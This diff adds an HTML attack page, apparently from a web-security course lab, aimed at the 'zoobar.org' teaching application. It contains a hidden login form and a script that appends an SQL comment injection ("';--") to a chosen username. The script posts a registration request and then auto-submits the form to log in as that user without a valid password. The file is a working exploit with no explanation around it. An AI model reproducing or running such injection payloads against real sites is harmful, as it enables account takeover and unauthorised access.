@@ -1,0 +1,30 @@
+<html>
+<body>
+<form id="F" method='POST'
+action="http://zoobar.org/index.php" hidden>
+	<input type="text" name="login_username" value="x" id="user"/>
+	<input type="password" name="login_password" value="pass" id="password"/>
+	<input name="submit_login" type="submit" value="Log in" id="buttonHidden" />
+</form>
+
+<input id="userInput">
+<button type="button" onclick="sqlInjection()">
+Log in
+</button>
+
+<script>
+function sqlInjection(){
+	var userInput = document.getElementById("userInput").value;
+	var xmlReq = new XMLHttpRequest();
+	xmlReq.onloadstart = function () {
+      		document.getElementById("user").value = userInput+"';--";
+		document.getElementById("buttonHidden").click();
+    	};
+	xmlReq.open("POST", "http://zoobar.org/index.php", true);
+    	xmlReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	var passHolder = document.getElementById("password").value
+    	xmlReq.send("login_username=" + userInput + "';--&login_password="+ passHolder +"&submit_registration=Register");
+}
+</script>
+</body>
+</html>
